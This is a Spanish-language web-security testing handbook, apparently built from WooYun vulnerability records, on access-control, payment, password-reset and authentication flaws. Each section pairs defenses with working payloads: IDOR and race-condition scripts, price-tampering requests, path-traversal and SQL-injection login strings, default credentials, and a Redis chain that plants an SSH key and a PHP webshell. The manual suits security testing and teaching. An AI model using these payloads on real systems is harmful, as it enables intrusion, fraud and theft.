# Seguridad de Lógica Web y Autenticación

> **Fuente**: Extraído de la base de datos de vulnerabilidades WooYun (88,636 vulnerabilidades reales), abarcando dos grandes categorías: defectos de lógica (8,292) y acceso no autorizado (14,377)
> **Uso**: Manual de referencia práctica para pruebas de vulnerabilidades de lógica y bypass de autenticación en pruebas de seguridad de aplicaciones web

---

## I. Vulnerabilidades de Escalada de Privilegios (Broken Access Control)

### 1.1 Naturaleza de la vulnerabilidad

La causa raíz de las vulnerabilidades de escalada de privilegios es **la ausencia o incompletitud de la verificación de autorización** — el servidor no valida, en cada operación sobre un recurso, si el solicitante posee el permiso correspondiente.

| Tipo | Definición | Causa raíz | Nivel de riesgo |
|------|------|------|----------|
| Escalada horizontal | Acceso indebido entre usuarios del mismo nivel | No se valida la propiedad del recurso | Alto |
| Escalada vertical | Un usuario con menos privilegios ejecuta operaciones de mayor privilegio | No se valida el permiso del rol | Crítico |

### 1.2 Escalada Horizontal (IDOR)

**Escenarios frecuentes y formas de explotación**:

```
Escenario 1: Enumeración de ID — un ID autoincremental resulta predecible
GET /address/edit/?addid=100001  → dirección propia
GET /address/edit/?addid=100002  → dirección de otro usuario (escalada de privilegios)

Escenario 2: Ataque de sustitución de recurso — la operación de modificación carece de verificación de propiedad
La cuenta A crea una factura ID=1001 → la cuenta B, al modificar, sustituye por ID=1001 → la factura de A es sobrescrita

Escenario 3: Enumeración de parámetros en API — la interfaz solo valida el inicio de sesión, no el permiso
/personal/center/family/{id}/edit → al sustituir el id se filtra información de otro usuario
```

**Método de prueba**:
1. Capturar el tráfico y registrar el parámetro ID en solicitudes normales (uid/orderId/addid, etc.)
2. Sustituirlo por el ID de otro usuario y observar la respuesta
3. Automatizar la enumeración (Burp Intruder o script)
4. Prestar atención a las cuatro operaciones CRUD; modificar y eliminar son las de mayor riesgo

```python
# Idea para la detección automatizada de IDOR
def idor_test(base_url, param_name, id_range, session_cookie):
    for id in range(id_range[0], id_range[1]):
        resp = requests.get(
            f"{base_url}?{param_name}={id}",
            cookies={"session": session_cookie}
        )
        if resp.status_code == 200 and "característica_de_datos_sensibles" in resp.text:
            print(f"[!] IDOR: {param_name}={id}")
```

**Matriz de pruebas de escalada de privilegios**:

| Tipo de operación | Método de prueba | Nivel de riesgo |
|----------|----------|----------|
| Ver | Sustituir el ID del recurso | Medio |
| Modificar | Sustituir el ID del recurso + datos | Alto |
| Eliminar | Sustituir el ID del recurso | Crítico |
| Crear | Sustituir el ID del usuario propietario | Alto |

### 1.3 Escalada Vertical

**Forma de explotación principal**:

```http
# Un usuario normal manipula el identificador de rol al modificar su perfil
POST /updateUser HTTP/1.1
user.aid=3&user.name=test   # aid=3 usuario normal

# Manipulado a administrador
POST /updateUser HTTP/1.1
user.aid=1&user.name=test   # aid=1 superadministrador
```

**Puntos clave de detección**:
- Enumerar los ID de rol: habitualmente 1=superadmin, 2=administrador, 3+=usuario normal
- Probar el cambio de rol: modificar el identificador de rol en la solicitud (role/aid/type/level)
- Acceder directamente a la URL de la interfaz de administrador con una cuenta de bajos privilegios
- Manipular el identificador de permiso: `isAdmin=0->1`, `role=user->admin`

### 1.4 Medidas de defensa

- Verificar obligatoriamente la propiedad antes de acceder al recurso: `WHERE id=? AND user_id=usuario_actual`
- Usar UUID en lugar de ID autoincremental, para evitar la enumeración
- Registrar logs de auditoría para operaciones sensibles
- Aplicar el principio de privilegio mínimo, con autorización verificada interfaz por interfaz en el backend
- Centralizar la lógica de verificación de permisos (middleware/interceptor)

---

## II. Vulnerabilidades de Lógica de Pago

### 2.1 Naturaleza de la vulnerabilidad

El núcleo de las vulnerabilidades de pago es **un error en el límite de confianza** — se traslada al cliente lógica sensible como el cálculo del precio, sin que el servidor la valide de forma independiente.

```
Modelo de seguridad: Zona no confiable (cliente) -> límite de confianza -> Zona confiable (servidor)
Implementación incorrecta: aceptar directamente el precio enviado por el cliente como dato de hecho
Implementación correcta: el cliente solo proporciona el ID del producto; el servidor consulta y calcula el precio de forma independiente
```

### 2.2 Escenarios comunes y técnicas de explotación

**Escenario 1: Manipulación directa del monto**

```http
# Solicitud original
POST /order/create HTTP/1.1
{"productId":"12345","quantity":1,"price":299.00}

# Solicitud manipulada
POST /order/create HTTP/1.1
{"productId":"12345","quantity":1,"price":0.01}
```

**Escenario 2: Abuso de la lógica de cupones/descuentos**

```
1. Comprar el producto A (59 yuanes), activando "canje con compra mínima de 59: producto B a 5.9 yuanes"
2. Realizar el pedido de A+B, pagando 64.9 yuanes
3. Cancelar el producto A, conservando solo B
4. En la práctica, se obtiene por 5.9 yuanes el producto B cuyo precio original es 21 yuanes

Idea de prueba: combinar pedidos y luego cancelar parcialmente, devolver tras usar un cupón, solicitar reembolso tras canjear puntos
```

**Escenario 3: Obtención fraudulenta de moneda virtual**
- El registro por referido otorga puntos -> se descifra el captcha por fuerza bruta para registrar cuentas masivamente -> se canjean los puntos por productos físicos

**Escenario 4: Ataque de cantidad/número negativo**
- `count=1 -> count=-1` (un número negativo provoca un reembolso)
- `price=100 -> price=-100` (monto negativo)

### 2.3 Método de prueba sistemático

```
Fase 1: Identificación de la huella de parámetros
  - Capturar el tráfico de la interfaz de creación de pedidos
  - Identificar los parámetros de precio (price/amount/total/cost/discount)
  - Determinar el tipo de dato del parámetro (entero/flotante/cadena)

Fase 2: Prueba de valores límite
  - Valor mínimo: 0, 0.01
  - Números negativos: -1, -100, -0.01
  - Formato: notación científica (1e-10), JSON anidado
  - Precisión: desbordamiento de punto flotante, errores de redondeo

Fase 3: Bypass de lógica
  - Redundancia de parámetros: enviar múltiples parámetros price
  - Sobrescritura de parámetros: primero subir el precio y luego bajarlo
  - Acumulación de cupones: manipulación doble de precio + descuento
  - Combinar pedidos y luego cancelar/devolver parcialmente

Fase 4: Verificación en cada etapa del flujo de pago
  - Generación del pedido -> verificar el monto del pedido
  - Redirección al pago -> validar el monto del pago
  - Callback de pago -> falsificar la firma del callback
  - Flujo de reembolso -> verificar el monto del reembolso
```

**Técnicas de explotación avanzadas**:

```python
# Manipulación de precio + carrera de concurrencia
import threading
def create_order():
    requests.post("/order/create", json={"price":0.01,"productId":"premium"})
threads = [threading.Thread(target=create_order) for _ in range(50)]
for t in threads: t.start()
```

```http
# Contaminación de parámetros: algunos frameworks procesan parámetros duplicados
POST /order/create?price=299.00&price=0.01

# Bypass mediante conversión de tipo
{"price":"0.01"}     cadena
{"price":1e-10}      notación científica
{"price":null}       inyección de NULL
```

### 2.4 Medidas de defensa

```
Capa 1 Validación de entrada: aceptar únicamente el ID del producto, no el price; el monto debe ser positivo con máximo 2 decimales
Capa 2 Lógica de negocio: el servidor calcula el precio de forma independiente; rechazar o requerir revisión manual si el monto se desvía de un umbral
Capa 3 Integridad de datos: firma del pedido (HMAC) contra manipulación; timestamp contra reproducción (replay); idempotencia contra duplicación
Capa 4 Validación de pago: el monto del callback debe igualar el monto del pedido; máquina de estados estricta; logs de auditoría de extremo a extremo
```

---

## III. Vulnerabilidades de Restablecimiento de Contraseña

### 3.1 Naturaleza de la vulnerabilidad

La naturaleza de las vulnerabilidades de restablecimiento de contraseña es **una ruptura en la cadena de verificación de identidad** — algún paso del flujo de restablecimiento no vincula correctamente la identidad del usuario.

### 3.2 Cuatro patrones principales de vulnerabilidad

**Patrón A: Filtración del código de verificación en la respuesta**

```http
POST /sendSmsCode HTTP/1.1
phone=13888888888

# La respuesta incluye directamente el código de verificación
{"code":0,"data":{"verifyCode":"123456"}}
```

Método de detección: interceptar el paquete de respuesta del envío del código de verificación, buscando un número de 4-6 dígitos.

**Patrón B: El código de verificación no está vinculado al usuario**

```
1. Recibir el código de verificación A en el propio número de teléfono
2. Iniciar la recuperación de contraseña sobre la cuenta objetivo
3. Usar el código de verificación A para completar la verificación (sin vincular la identidad del usuario)
Causa raíz: el código de verificación solo se valida por su vigencia, no por a qué usuario pertenece
```

**Patrón C: Los pasos de restablecimiento pueden omitirse**

```
Normal: introducir cuenta -> verificar identidad -> restablecer contraseña -> completar
Ataque: introducir cuenta -> [omitir] -> acceder directamente a la página de restablecimiento de contraseña

Forma de implementación:
1. Analizar el JS del frontend, localizando la URL de cada paso
2. Acceder directamente a la URL del paso 3
3. Modificar el DOM con F12: ocultar el paso de verificación, mostrar el paso de restablecimiento
```

**Patrón D: El parámetro de credencial es controlable**

```http
POST /resetPassword HTTP/1.1
username=victim&newPassword=hacked123
# Vulnerabilidad: username proviene del cliente y puede manipularse para apuntar a cualquier usuario
```

### 3.3 Flujo de prueba

```
Iniciar el restablecimiento de contraseña
  +-- Capturar el tráfico y analizar la respuesta -> ¿contiene el código de verificación? -> Patrón A
  +-- Analizar el flujo de verificación
  |     +-- Múltiples pasos -> intentar omitir pasos intermedios -> Patrón C
  |     +-- Un solo paso -> revisar la vinculación de parámetros
  |           +-- El ID de usuario es controlable -> manipulación de parámetros -> Patrón D
  |           +-- Vinculado a la Session -> prueba de fijación de sesión
  +-- Mecanismo del código de verificación
        +-- ¿El código está vinculado al usuario? -> Patrón B
        +-- ¿Puede descifrarse el código por fuerza bruta (sin límite de frecuencia)?
        +-- ¿El código tiene vigencia temporal?
```

### 3.4 Medidas de defensa

- Vincular el código de verificación a la Session del usuario, validando su propiedad
- El código de verificación debe ser de un solo uso y expirar en 60 segundos
- El token de restablecimiento debe ser de un solo uso e impredecible
- Validación de estado en el servidor durante todo el flujo, prohibiendo saltarse pasos
- Bloqueo tras 5 intentos fallidos, para prevenir fuerza bruta

---

## IV. Defectos de Lógica de Negocio

### 4.1 Naturaleza de la vulnerabilidad

Matriz de causas raíz de los defectos de lógica de negocio:

| Nivel | Tipo de defecto | Manifestación típica |
|------|----------|----------|
| Capa de negocio | Defecto de diseño del flujo | Pasos que pueden omitirse, estado que puede falsificarse |
| Capa de interfaz | Confianza excesiva en el parámetro | Validación en el cliente, sin validación en el servidor |
| Capa de autenticación | Defecto en la gestión de credenciales | Filtración de Token, fijación de Session |
| Capa de autorización | Límites de permiso difusos | Escalada de privilegios horizontal/vertical |

### 4.2 Bypass del código de verificación (CAPTCHA)

**Método de bypass 1: el código de verificación no se actualiza**
- Tras un intento de inicio de sesión fallido, el código de verificación no se actualiza automáticamente y puede reutilizarse el mismo código
- Explotación: reconocerlo manualmente una vez, y con el código fijo realizar fuerza bruta sobre la contraseña

**Método de bypass 2: el código de verificación puede descifrarse por fuerza bruta**
- 4-6 dígitos puramente numéricos, sin límite de intentos ni de frecuencia
- Espacio de fuerza bruta de 10,000-1,000,000, completable en unos 30 segundos con 30 hilos

**Método de bypass 3: validación solo en el frontend**
- El código de verificación solo se valida en el JS del frontend; eliminar el código de validación del frontend o invocar directamente la interfaz permite el bypass

**Lista de verificación de seguridad del código de verificación**:
- ¿Se filtra el código de verificación en la respuesta?
- ¿Está vinculado a la Session/usuario?
- ¿Tiene vigencia temporal (se recomienda 60 segundos)?
- ¿Se fuerza su actualización tras un fallo de verificación?
- ¿Tiene límite de frecuencia (se recomienda 5 veces/minuto)?
- ¿Tiene suficiente complejidad (se recomienda 6 caracteres alfanuméricos mixtos)?

### 4.3 Condición de Carrera (Race Condition)

Escenarios aplicables: uso de cupones, canje de puntos, descuento de inventario, pago con saldo

```python
import threading, requests
def redeem():
    requests.post("/redeem", data={"points":1000, "item":"iPhone"})

# 100 solicitudes concurrentes, intentando canjear varias veces el mismo saldo de puntos
threads = [threading.Thread(target=redeem) for _ in range(100)]
for t in threads: t.start()
```

Causa raíz: la verificación del saldo y el descuento del saldo no son una operación atómica, y bajo concurrencia pueden pasar la verificación múltiples veces.

### 4.4 Método sistemático de manipulación de parámetros

| Tipo de parámetro | Dirección de manipulación | Ejemplo |
|----------|----------|------|
| ID de usuario | Sustituir por otro usuario | uid=1001->1002 |
| Monto | Reducir/poner en cero/negativo | price=100->0.01 |
| Cantidad | Negativo | count=1->-1 |
| Estado | Invertir el booleano | isPaid=false->true |
| Rol | Elevar privilegio | role=user->admin |
| Tiempo | Extender la vigencia | expireTime->2099-12-31 |

### 4.5 Método de análisis inverso del flujo de negocio

```
Paso 1: dibujar el diagrama completo del flujo de negocio
Paso 2: identificar el punto de verificación de cada etapa
Paso 3: evaluar si la verificación puede eludirse (¿frontend/backend? ¿reproducible? ¿parámetro controlable?)
Paso 4: diseñar los casos de prueba de bypass

Ejemplo (flujo de restablecimiento de contraseña):
[Introducir cuenta] -> [Enviar código de verificación] -> [Verificar identidad] -> [Establecer nueva contraseña]
     |              |              |              |
  Enumeración de cuenta   Filtración del código   Omisión de pasos   Manipulación de parámetros
```

### 4.6 Principios de defensa

- **Autoridad del servidor**: toda la validación se completa en el servidor; la validación del frontend es solo para UX
- **Operación atómica**: el negocio crítico (deducción de saldo/inventario) debe usar transacciones + bloqueos
- **Máquina de estados**: el flujo de negocio debe avanzar estrictamente conforme a la máquina de estados, sin poder omitir pasos
- **Anti-repetición**: diseño idempotente para interfaces críticas, con solicitudes que incluyan timestamp + firma

---

## V. Bypass de Autenticación

### 5.1 Naturaleza de la vulnerabilidad

El núcleo del bypass de autenticación es **la ruptura de la cadena de confianza**: el sistema confía erróneamente en una declaración de identidad proveniente de una fuente no confiable.

### 5.2 Falsificación de Cookie/Session

```
# Escribir directamente una Cookie para obtener una identidad
GET /registeruser/CookInsert?userAccount=admin&inner=1
-> Se escribe la identidad admin en la Cookie, obteniendo directamente una Session de administrador

# El identificador de identidad en la Cookie es predecible
Cookie: admin=true; userId=1
-> Modificar el valor de la Cookie permite cambiar de identidad
```

Bypass de JWT:

| Técnica | Payload |
|------|---------|
| Algoritmo nulo | alg: none |
| Clave débil | Descifrar por fuerza bruta la clave HS256 |
| Confusión de algoritmo | Convertir RS256 a HS256, firmando con la clave pública |

### 5.3 Bypass mediante manipulación de la respuesta

```
Normal: solicitud de verificación -> {"status":"0","msg":"código de verificación incorrecto"} -> permanece en la página de verificación
Ataque: solicitud de verificación -> interceptar la respuesta -> modificar a {"status":"1","msg":"éxito"} -> avanza al siguiente paso
```

Condición aplicable: el cliente controla el flujo según el estado de la respuesta + los pasos posteriores del servidor no vuelven a validar.

### 5.4 Falsificación de IP/Bypass de cabeceras

```http
# Cabeceras comúnmente usadas para eludir listas blancas de IP
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
Host: localhost
```

### 5.5 Bypass de ruta

```
# Confusión de mayúsculas/minúsculas
/ADMIN/  /Admin/  /aDmIn/

# Bypass mediante codificación URL
%2e%2e%2f = ../
%252e%252e%252f = ../ (doble codificación)

# Truncamiento por byte nulo
../../../etc/passwd%00.jpg

# Bypass añadiendo sufijo
/admin -> /admin/  /admin;.js  /admin%23
```

### 5.6 Acceso no autorizado al panel de administración

Rutas no autorizadas de alta frecuencia:

```
# Middleware Web
/console/              (WebLogic)
/manager/html          (Tomcat)
/jmx-console/          (JBoss)
/actuator/env          (Spring Boot)
/actuator/heapdump     (Spring Boot, puede filtrar contraseñas)

# Interfaces de API
/swagger-ui.html       (documentación de API)
/api-docs              (documentación de API)
/api/configs           (filtración de configuración)

# Depuración/administración
/admin/index.jsp
/phpMyAdmin/
/druid/index.html      (monitoreo Druid)
```

Referencia rápida de contraseñas débiles de middleware:

| Middleware | Contraseñas débiles comunes |
|--------|-----------|
| Tomcat | admin:admin, tomcat:tomcat |
| WebLogic | weblogic:weblogic, weblogic:12345678 |
| JBoss | admin:admin (o sin autenticación) |

### 5.7 Acceso no autorizado a bases de datos/servicios

| Servicio | Puerto | Comando de verificación | Forma de explotación |
|------|------|----------|----------|
| Redis | 6379 | redis-cli -h IP info | Escribir clave pública SSH/Webshell/tarea programada |
| MongoDB | 27017 | mongo IP:27017 | Conexión directa sin autenticación, exportar todos los datos |
| Elasticsearch | 9200 | curl IP:9200/_cat/indices | Leer datos de los índices |
| Memcached | 11211 | echo stats, nc IP 11211 | Filtración de datos |
| Docker API | 2375 | curl IP:2375/info | Escape de contenedor/RCE |

Cadena de explotación de Redis no autorizado (alto riesgo):

```bash
redis-cli -h target
# Escribir clave pública SSH
config set dir /root/.ssh/
config set dbfilename authorized_keys
set x "\n\nssh-rsa AAAA...\n\n"
save

# Escribir Webshell
config set dir /var/www/html/
config set dbfilename shell.php
set x "<?php system($_GET['c']);?>"
save
```

### 5.8 Bypass de Session

```
# Filtración del ID de Session (logs/URL)
/logs/ctp.log -> contiene el ID de Session -> se usa directamente

# Ataque de fijación de Session (Session Fixation)
Forzar al usuario a usar un ID de Session especificado por el atacante

# Predicción de Session
Session débil generada por timestamp/número secuencial -> se puede predecir la siguiente Session
```

### 5.9 Contraseña universal (inicio de sesión mediante inyección SQL)

```
Usuario: ' or 1=1--
Contraseña:   cualquiera

Usuario: admin'--
Contraseña:   cualquiera
```

### 5.10 Lista de verificación de pruebas de bypass de autenticación

| Elemento de prueba | Método | Herramienta |
|--------|------|------|
| Falsificación de Cookie | Modificar el campo identificador de usuario | BurpSuite |
| Fijación de Session | Reutilizar la Session de otro usuario | Herramienta de captura de tráfico |
| Manipulación de respuesta | Modificar el código de estado devuelto | BurpSuite |
| Falsificación de IP | Añadir X-Forwarded-For | curl/Burp |
| Bypass en el frontend | Modificar la lógica JS | DevTools |
| Manipulación de JWT | Algoritmo nulo/clave débil | jwt.io/hashcat |
| Bypass de ruta | Mayúsculas-minúsculas/codificación/truncamiento | Manual + diccionario |
| Contraseña débil | Prueba de credenciales por defecto | Hydra |
| Inicio de sesión mediante inyección SQL | Contraseña universal | Manual |

### 5.11 Medidas de defensa

| Ámbito | Medida |
|------|------|
| Red | Los servicios de la red interna no deben exponerse a internet; acceso mediante VPN/bastión |
| Autenticación | Forzar contraseñas complejas, deshabilitar cuentas por defecto, habilitar MFA |
| Autorización | Verificación de permisos en cada interfaz del backend, principio de privilegio mínimo |
| Session | Regenerar el ID de Session tras el inicio de sesión, HttpOnly+Secure |
| Monitoreo | Alertas de inicio de sesión anómalo, bloqueo por número de fallos, auditoría de logs |
| Fortalecimiento | Deshabilitar interfaces de depuración, eliminar páginas de administración por defecto |

---

## VI. Marco de Pruebas Sistemático

### 6.1 Método de prueba en cuatro fases

```
Fase 1: Recopilación de inteligencia
  - Enumerar todos los puntos funcionales e interfaces
  - Dibujar el diagrama del flujo de negocio
  - Identificar operaciones sensibles (pago/restablecimiento/cambio de permisos)
  - Determinar la controlabilidad de los parámetros

Fase 2: Modelado de amenazas
  - Analizar los parámetros de entrada y el límite de confianza de cada interfaz
  - Marcar validación en servidor vs. frontend
  - Construir un árbol de ataque (clasificado por escalada de privilegios/pago/autenticación)
  - Priorizar (alto impacto x alta probabilidad)

Fase 3: Validación de vulnerabilidades
  - Probar cada elemento por orden de prioridad
  - Registrar la PoC (capturas de solicitud/respuesta)
  - Evaluar el alcance del impacto (volumen de datos/número de usuarios/monto)

Fase 4: Entrega del informe
  - Descripción de la vulnerabilidad + pasos de reproducción
  - Análisis de causa raíz + evaluación de impacto
  - Recomendaciones de corrección (a corto y largo plazo)
  - Calificación de riesgo (CVSS)
```

### 6.2 Referencia rápida de patrones de vulnerabilidad frecuentes

| Patrón de vulnerabilidad | Señal de detección | Método de verificación rápida |
|----------|----------|-------------|
| IDOR | La URL/parámetro contiene un ID autoincremental | Sustituir el ID y ver si devuelve datos de otro usuario |
| Manipulación de monto | La solicitud contiene price/amount | Cambiar a 0.01 y observar el pedido |
| Filtración del código de verificación | Capturar el tráfico tras enviar el código | Buscar un número de 4-6 dígitos en la respuesta |
| Omisión de pasos | Flujo de múltiples pasos | Acceder directamente a la URL de un paso posterior |
| Manipulación de respuesta | El cliente redirige según el status | Cambiar status=1 y ver si se permite el paso |
| Panel de administración no autorizado | El escaneo de directorios revela una ruta de administración | Acceder directamente y ver si requiere inicio de sesión |
| Contraseña débil | Se encuentra una página de inicio de sesión | Probar credenciales por defecto como admin/admin |
| Condición de carrera | Operaciones de saldo/inventario/cupón | Enviar 50+ solicitudes concurrentes y observar si se descuenta de más |

### 6.3 Herramientas recomendadas para uso práctico

| Herramienta | Uso principal | Escenario aplicable |
|------|----------|----------|
| BurpSuite | Interceptación de tráfico, manipulación de parámetros, repetición | Herramienta central para todos los escenarios |
| Postman | Pruebas de API, solicitudes masivas | Pruebas de lógica de interfaces |
| Hydra | Fuerza bruta de contraseñas | Contraseñas débiles/credential stuffing |
| OWASP ZAP | Escaneo automatizado | Descubrimiento inicial |
| Scripts personalizados | Pruebas de concurrencia, enumeración de ID | Condición de carrera/IDOR |

---

*Versión del documento: v1.0*
*Fuente de datos: base de datos de vulnerabilidades WooYun (88,636 registros): defectos de lógica (8,292) + acceso no autorizado (14,377)*
*Fecha de generación: 2026-02-06*
